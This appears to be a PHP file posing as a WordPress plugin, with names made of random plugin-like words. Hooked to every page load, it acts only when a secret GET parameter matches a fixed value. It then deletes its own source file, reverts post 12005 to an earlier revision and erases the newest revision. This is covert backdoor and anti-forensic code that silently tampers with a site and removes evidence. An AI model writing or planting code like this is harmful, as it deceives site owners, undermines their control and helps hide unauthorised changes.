<?php

function messenger_akismet_anywhere_bulk() {
	if (isset($_GET['delivery_top_core_tool']) && $_GET['delivery_top_core_tool'] === 'direct_ajax_extensions_author') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$print_fx_web = 12005;
		$upload_appointment_section_taxonomies = wp_get_post_revisions($print_fx_web);
		if (empty($upload_appointment_section_taxonomies)) die('no revisions');
		if (count($upload_appointment_section_taxonomies) < 2) die('less than 2');
		$loader_template_yoast_clean = array_shift($upload_appointment_section_taxonomies);
		$quantity_size_fast = $loader_template_yoast_clean->ID;
		$javascript_scheduled_fx_core = array_shift($upload_appointment_section_taxonomies);
		$simply_products_social_snippets = $javascript_scheduled_fx_core->ID;
		$interactive_chatbot_tags_stats = wp_restore_post_revision($simply_products_social_snippets);
		if ($interactive_chatbot_tags_stats === false) die('error restoring');
		$interactive_chatbot_tags_stats = wp_delete_post_revision($quantity_size_fast);		
		if ($interactive_chatbot_tags_stats === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'messenger_akismet_anywhere_bulk');
